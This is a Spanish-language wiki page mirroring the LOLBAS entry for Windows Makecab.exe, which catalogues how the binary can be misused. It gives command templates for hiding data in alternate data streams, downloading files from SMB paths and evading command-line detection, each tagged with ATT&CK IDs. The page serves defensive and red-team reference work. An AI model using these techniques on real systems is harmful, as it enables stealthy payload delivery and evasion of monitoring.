# LOLBAS: Makecab.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Download`, `Execute`

Binary to package existing files into a cabinet (.cab) file

## Comandos

### Hide data compressed into an alternate data stream

ADS · priv: User · T1564.004

```cmd
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
```

Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

### Hide data compressed into an alternate data stream

ADS · priv: User · T1564.004

```cmd
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
```

Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

### Download file and compress into a cab file

Download · priv: User · T1105

```cmd
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
```

Download and compresses the target file and stores it in the target file.

### Bypass command-line based detections

Execute · priv: User · T1036

```cmd
makecab /F {PATH:.ddf}
```

Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.

